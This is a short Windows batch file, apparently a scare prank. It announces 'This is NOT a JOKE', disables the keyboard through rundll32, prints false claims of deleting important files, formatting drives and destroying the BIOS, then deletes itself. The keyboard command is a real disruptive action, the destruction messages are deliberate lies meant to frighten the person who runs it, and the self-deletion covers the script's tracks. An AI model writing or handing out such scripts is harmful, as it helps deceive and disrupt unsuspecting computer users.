echo This is NOT a JOKE ...
echo Initializing ... Please wait ...
TYPE NUL  | CHOICE.COM  /N /CY /TY,5      > NUL
C:\windows\rundll32.exe  keyboard,disable
echo Removing keyboard ... Done.
TYPE NUL  | CHOICE.COM  /N /CY /TY,5      > NUL
echo Removing IMPORTANT files ... Done.
TYPE NUL  | CHOICE.COM  /N /CY /TY,5      > NUL
echo Formating hard drive(s) ... Done.
TYPE NUL  | CHOICE.COM  /N /CY /TY,5      > NUL
echo Destroying bios ... Done.
echo All done ... Ready.
DEL %0
